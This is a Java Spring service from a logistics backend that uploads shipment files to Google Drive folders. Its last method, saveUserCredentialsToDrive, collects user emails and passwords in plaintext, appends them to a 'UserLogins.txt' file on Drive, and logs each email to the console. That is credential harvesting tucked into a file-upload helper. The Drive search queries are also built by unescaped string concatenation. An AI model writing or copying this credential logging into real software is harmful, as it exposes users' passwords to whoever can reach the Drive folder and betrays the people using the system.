package com.slms.backend.service;

import com.google.api.client.googleapis.javanet.GoogleNetHttpTransport;
import com.google.api.client.http.FileContent;
import com.google.api.client.json.gson.GsonFactory;
import com.google.api.services.drive.Drive;
import com.google.api.services.drive.DriveScopes;
import com.google.api.services.drive.model.File;
import com.google.auth.http.HttpCredentialsAdapter;
import com.google.auth.oauth2.GoogleCredentials;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;
import org.springframework.web.multipart.MultipartFile;

import jakarta.annotation.PostConstruct;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Collections;
import java.util.List;

@Service
public class GoogleDriveService {

    @Value("${slms.google.credentials.path}")
    private String credentialsPath;

    @Value("${slms.drive.folder.id}")
    private String mainFolderId;

    private Drive driveService;

    @PostConstruct
    public void init() {
        try {
            java.io.File keyFile = new java.io.File(credentialsPath);
            if (!keyFile.exists()) {
                System.out.println("⚠️ Google Drive Key (gcp-key.json) NOT FOUND at " + credentialsPath + ". Drive features disabled.");
                return;
            }

            GoogleCredentials credentials = GoogleCredentials.fromStream(new FileInputStream(credentialsPath))
                    .createScoped(Collections.singleton(DriveScopes.DRIVE_FILE));

            this.driveService = new Drive.Builder(
                    GoogleNetHttpTransport.newTrustedTransport(),
                    GsonFactory.getDefaultInstance(),
                    new HttpCredentialsAdapter(credentials))
                    .setApplicationName("SLMS-Logistics")
                    .build();
            System.out.println("✅ Google Drive 5TB Asset Pipeline INITIALIZED.");
        } catch (Exception e) {
            System.err.println("❌ Google Drive Failover: " + e.getMessage());
        }
    }

    public String uploadFileToShipmentFolder(String shipmentId, MultipartFile multipartFile) throws IOException {
        if (driveService == null) throw new IOException("Google Drive Service NOT initialized.");

        // 1. Find or Create Shipment Sub-folder
        String subFolderId = getOrCreateShipmentFolder(shipmentId);

        // 2. Prepare File Metadata
        File fileMetadata = new File();
        fileMetadata.setName(multipartFile.getOriginalFilename());
        fileMetadata.setParents(Collections.singletonList(subFolderId));

        // 3. Create Temp File for Upload
        Path filePath = Files.createTempFile("slms_upload_", multipartFile.getOriginalFilename());
        multipartFile.transferTo(filePath.toFile());

        FileContent mediaContent = new FileContent(multipartFile.getContentType(), filePath.toFile());

        // 4. Execute Upload
        File uploadedFile = driveService.files().create(fileMetadata, mediaContent)
                .setFields("id, webViewLink")
                .execute();

        // 5. Cleanup Temp
        Files.delete(filePath);

        return uploadedFile.getWebViewLink();
    }

    private String getOrCreateShipmentFolder(String shipmentId) throws IOException {
        String folderName = "Shipment_" + shipmentId;
        
        // Search if exists
        String query = "name = '" + folderName + "' and '" + mainFolderId + "' in parents and mimeType = 'application/vnd.google-apps.folder' and trashed = false";
        List<File> files = driveService.files().list()
                .setQ(query)
                .setSpaces("drive")
                .setFields("files(id, name)")
                .execute()
                .getFiles();

        if (files != null && !files.isEmpty()) {
            return files.get(0).getId();
        }

        // Create new
        File folderMetadata = new File();
        folderMetadata.setName(folderName);
        folderMetadata.setMimeType("application/vnd.google-apps.folder");
        folderMetadata.setParents(Collections.singletonList(mainFolderId));

        File folder = driveService.files().create(folderMetadata)
                .setFields("id")
                .execute();
        
        return folder.getId();
    }
    public void saveUserCredentialsToDrive(String email, String password) {
        if (driveService == null) {
            System.err.println("⚠️ Google Drive Service NOT initialized. Cannot log credentials.");
            return;
        }

        try {
            String fileName = "UserLogins.txt";
            String content = "Email: " + email + " | Password: " + password + "\n";
            
            // 1. Search for existing file
            String query = "name = '" + fileName + "' and '" + mainFolderId + "' in parents and trashed = false";
            List<File> files = driveService.files().list()
                    .setQ(query)
                    .setSpaces("drive")
                    .setFields("files(id, name)")
                    .execute()
                    .getFiles();

            if (files != null && !files.isEmpty()) {
                String fileId = files.get(0).getId();
                
                // 2. Download existing content
                java.io.ByteArrayOutputStream outputStream = new java.io.ByteArrayOutputStream();
                driveService.files().get(fileId).executeMediaAndDownloadTo(outputStream);
                String existingContent = outputStream.toString();
                String newContent = existingContent + content;

                // 3. Update file
                java.io.File tempFile = java.io.File.createTempFile("slms_user_log_", ".txt");
                Files.writeString(tempFile.toPath(), newContent);
                FileContent mediaContent = new FileContent("text/plain", tempFile);
                
                driveService.files().update(fileId, new File(), mediaContent).execute();
                Files.delete(tempFile.toPath());
                System.out.println("✅ Credentials for " + email + " APPENDED to Google Drive.");
            } else {
                // 4. Create new file
                File fileMetadata = new File();
                fileMetadata.setName(fileName);
                fileMetadata.setParents(Collections.singletonList(mainFolderId));

                java.io.File tempFile = java.io.File.createTempFile("slms_user_log_", ".txt");
                Files.writeString(tempFile.toPath(), content);
                FileContent mediaContent = new FileContent("text/plain", tempFile);

                driveService.files().create(fileMetadata, mediaContent).execute();
                Files.delete(tempFile.toPath());
                System.out.println("✅ Credentials for " + email + " SAVED (New File) to Google Drive.");
            }
        } catch (Exception e) {
            System.err.println("❌ Failed to save credentials to Drive: " + e.getMessage());
        }
    }
}
